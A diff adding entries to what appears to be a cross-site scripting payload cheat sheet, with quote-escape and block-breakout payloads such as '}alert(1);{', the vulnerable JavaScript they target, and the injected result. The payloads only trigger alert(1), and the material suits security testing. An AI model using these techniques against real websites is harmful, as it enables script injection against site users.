@@ -113,6 +113,13 @@
 \'alert(1)//
 ```
 
+* Example source code
+```html
+<script>
+    var sitekey = 'REFLECTED_HERE';
+</script>
+```
+
 * If we input payload '-alert(1)-' it will be like this
 ```html
 <script>
@@ -124,9 +131,59 @@ The quotes are escaped by a backslash so we need to bypass them
 * After input the payload
 ```html
 <script>
-    var sitekey = '\'alert(1)//';
+    var sitekey = '\\'alert(1)//';
 </script>
 ```
+
+9. Use when there’s multi reflection in the same line of JS code
+```html
+/alert(1)//\
+/alert(1)}//\
+```
+
+* Example source code
+```html
+<script>
+    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
+</script>
+```
+
+* After input the payload
+```html
+<script>
+    var a = '/alert(1)//\'; var b = '/alert(1)//\';
+</script>
+```
+
+10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
+```html
+'}alert(1);{'
+\'}alert(1);{// 
+```
+
+* Example source code
+```html
+<script>
+    var greeting;
+    var time = 1;
+    if (time < 10) {
+    test = 'REFLECTED_HERE';
+  }
+</script>
+```
+
+* After input the payload
+```html
+<script>
+    var test;
+    var time = 1;
+    if (time < 10) {
+    test = ''}alert(1);{'';
+  }
+</script>
+```
+
+> Payload number 2 uses when quote escaped by backslash
 
 
 *Will be updated again!
